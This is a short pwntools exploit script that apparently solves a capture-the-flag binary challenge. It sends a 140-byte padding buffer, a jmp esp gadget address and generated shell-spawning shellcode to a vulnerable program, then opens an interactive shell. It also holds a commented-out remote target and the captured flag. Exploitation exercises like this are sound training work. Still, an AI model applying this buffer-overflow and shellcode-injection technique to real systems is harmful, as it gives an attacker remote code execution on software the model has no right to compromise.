from pwn import *
elf = context.binary = ELF("./chall")
p = process()
# p = remote("116.254.117.234",5200)
offset = 140
jmp_esp = 0x0804923c
rop = ROP(context.binary)
rop.raw(b"A" * offset)
rop.raw(jmp_esp)
rop.raw(asm(shellcraft.sh()))
p.sendline(rop.chain())
p.interactive()

# Flag : STEMBACTF{B1n4ry_3xp01tat10n_1nj3c7_5h3llc0de}
